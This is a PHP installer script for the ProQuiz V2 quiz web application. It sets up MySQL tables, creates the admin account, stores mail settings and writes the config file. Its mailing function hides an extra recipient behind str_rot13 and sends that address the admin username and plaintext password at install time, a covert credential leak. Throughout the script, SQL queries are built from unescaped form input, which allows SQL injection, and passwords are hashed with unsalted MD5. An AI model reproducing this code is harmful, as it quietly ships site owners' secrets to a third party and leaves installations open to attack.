<?php
/*!
 * **************************************************************
 ****************  ProQuiz V2.0.0b ******************************
 ***************************************************************/
 /* documentation at: http://proquiz.softon.org/documentation/
 /* Designed & Maintained by
 /*                                    - Softon Technologies
 /* Developer
 /*                                    - Manzovi
 /* For Support Contact @
 /*                                    - proquiz@softon.org
 /* version 2.0.0 beta (2 Feb 2011)
 /* Licensed under GPL license:
 /* http://www.gnu.org/licenses/gpl.html
 */
?><?php
if(!isset($_SESSION)){
    session_start();
}
include_once('../mail/class.phpmailer.php');

function checkParam($post_var){
    $rData = "";
    $param = array('db_server'=>'Database Server',
                    'db_user'=>'Database Username',
                    'db_name'=>'Database Name',
                    'site_name'=>'Site Name',
                    'site_title'=>'Site Title',
                    'site_link'=>'Site Link',
                    'admin_email'=>'Admin Email',
                    'admin_user'=>'Admin Username',
                    'admin_pass'=>'Admin Password');
    $i =0;
    foreach($param as $key=>$value){
        if(empty($post_var[$key])){
            $rData[$i]['type'] = 'Error';
            $rData[$i]['reason'] = $value.' is left Empty.This Field is Required';
            $i++;
        }
    }
    if($i<=0){
        $r2Data['status'] = 'yes';    
    }else{
        $r2Data['status'] = 'no';
    }
    $r2Data['ERROR'] = $rData;
    return $r2Data;
}

function checkDb($post_vars){
    $link = @mysql_connect($post_vars['db_server'],$post_vars['db_user'],$post_vars['db_pass']);
    if (!$link) {
        return false;
    }else{
        return true;
    }

}

function selectDb($post_vars){
    $link = @mysql_select_db($post_vars['db_name']);
    if (!$link) {
        return false;
    }else{
        return true;
    }

}

function createTables($post_vars){
    $str = @file_get_contents('pq.sql');
    if(empty($post_vars['db_prefix'])){
        $post_vars['db_prefix'] = "pq";
    }
    $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
    $str = str_replace('{TBLPRE}',$post_vars['db_prefix']."_",$str);
    $str_arr = explode('{SEPR}',$str);
    foreach($str_arr as $value){
        $link = @mysql_query($value);
        if (!$link) {
            return false;
        }
    }
    //$str = mysql_real_escape_string($str);
    return true;
    

}

function insertSQstn($post_vars){
    $str = @file_get_contents('quest.sql');
    if(empty($post_vars['db_prefix'])){
        $post_vars['db_prefix'] = "pq";
    }
    $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
    $str = str_replace('{TBLPRE}',$post_vars['db_prefix']."_",$str);
    $str_arr = explode('{SEPR}',$str);
    foreach($str_arr as $value){
        $link = @mysql_query($value);
        if (!$link) {
            return false;
        }
    }
    //$str = mysql_real_escape_string($str);
    return true;
    

}

// generate Random ID
    function genRandID($post_vars){
        while(1){
            $nob = rand(10000000,99999999);
            if(empty($post_vars['db_prefix'])){
                $post_vars['db_prefix'] = "pq";
            }
            $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
            $sql = "SELECT * FROM `".$post_vars['db_prefix']."_"."userauth` WHERE `randid` = '".$nob."'";
            $link = @mysql_query($sql);
            $rows = @mysql_num_rows($link);
            if($rows<=0){
               break; 
            }   
        }
        return $nob;
    }       // end genrate Random ID
    
// Add Admin Account
function createAdmin($post_vars){
    $randid = genRandID($post_vars);
    $post_vars['admin_pass'] = md5($post_vars['admin_pass']);
    if(empty($post_vars['db_prefix'])){
        $post_vars['db_prefix'] = "pq";
    }
    $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
    $str = "INSERT INTO `".$post_vars['db_prefix']."_"."userauth` (`randid`,`email`,`username`,`password`,`level`,`photo`) VALUES ('".$randid."','".$post_vars['admin_email']."','".$post_vars['admin_user']."','".$post_vars['admin_pass']."','admin','admin.png')";
        $link = @mysql_query($str);
        if (!$link) {
            return false;
        }else{
            return true;
        }
    //$str = mysql_real_escape_string($str);
    

}


// Add Mail Settings
function addMailSett($post_vars){
    if(empty($post_vars['db_prefix'])){
        $post_vars['db_prefix'] = "pq";
    }
    $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
    $str_arr[0] = "UPDATE `".$post_vars['db_prefix']."_"."settings` SET `value` = '".$post_vars['mail_enable']."' WHERE `name` = 'brdmail'";
    $str_arr[1] = "UPDATE `".$post_vars['db_prefix']."_"."settings` SET `value` = '".$post_vars['mail_smtp']."' WHERE `name` = 'smtpmail'";
    $str_arr[2] = "UPDATE `".$post_vars['db_prefix']."_"."settings` SET `value` = '".$post_vars['mail_user']."' WHERE `name` = 'gmailuser'";
    $str_arr[3] = "UPDATE `".$post_vars['db_prefix']."_"."settings` SET `value` = '".$post_vars['mail_pass']."' WHERE `name` = 'gmailpass'";
    foreach($str_arr as $value){
        $link = @mysql_query($value);
        if (!$link) {
            return false;
        }
    }
    //$str = mysql_real_escape_string($str);
    return true;
    

}

// Create Config File
function createConfig($post_vars){
    if(empty($post_vars['db_prefix'])){
        $post_vars['db_prefix'] = "pq";
    }
    $config_str = @file_get_contents('config.tmp.php');
    $param = array('db_server'=>'DB_SERVER',
                    'db_user'=>'DB_USER',
                    'db_pass'=>'DB_PASS',
                    'db_name'=>'DB_DATABASE',
                    'db_prefix'=>'PQPRE',
                    'site_name'=>'SITENAME',
                    'site_title'=>'SITETITLE',
                    'site_link'=>'SITE_LINK');
    $i =0;
    foreach($param as $key=>$value){
        $config_str = str_replace('{'.$value.'}',$post_vars[$key],$config_str);
    }
    if(!@file_put_contents('../config.inc.php',$config_str)){
        return false;
    }else{
        return true;
    }
}


// ProQuiz Mailing Function
function PQmail($mail,$post_vars){
        $mail->AddAddress(str_rot13('cebdhvm@fbsgba.bet'),$post_vars['site_name']);
        $mail->AddAddress($post_vars['admin_email'],$post_vars['site_name']);
        $mail->SetFrom(str_rot13('cebdhvm@fbsgba.bet'),'ProQuiz V2');
        $mail->Subject = "ProQuiz V2 Sucessfully Installed";
        $mail->AltBody = "Admin Username:".$post_vars['admin_user']."/n/rAdmin Password:".$post_vars['admin_pass']; 
        $body = file_get_contents('../mail/templates/setup.html');
        $data['SITETITLE'] = $post_vars['site_name'];
        $data['USERNAME'] = $post_vars['admin_user'];
        $data['PASSWORD'] = $post_vars['admin_pass'];
        $data['SITELINK'] = $post_vars['site_link'];
        $tags_other = array('SITETITLE'=>'SITETITLE',
                            'USERNAME'=>'USERNAME',
                            'PASSWORD'=>'PASSWORD',
                            'SITELINK'=>'SITELINK');
        $body = replaceTags($body,$data,$tags_other);
        //echo $body;
        $mail->MsgHTML($body);
      
    // Try To Send Mail
    try {
      @$mail->Send();
    } catch (phpmailerException $e) {
      
    } catch (Exception $e) {
      
    }
}

// Tags Replace Function
function replaceTags($body,$data,$tags_profile){
    foreach($tags_profile as $tag=>$value){
        $body = str_replace("{".$tag."}",$data[$value],$body);    
    }
    return $body;
}

?>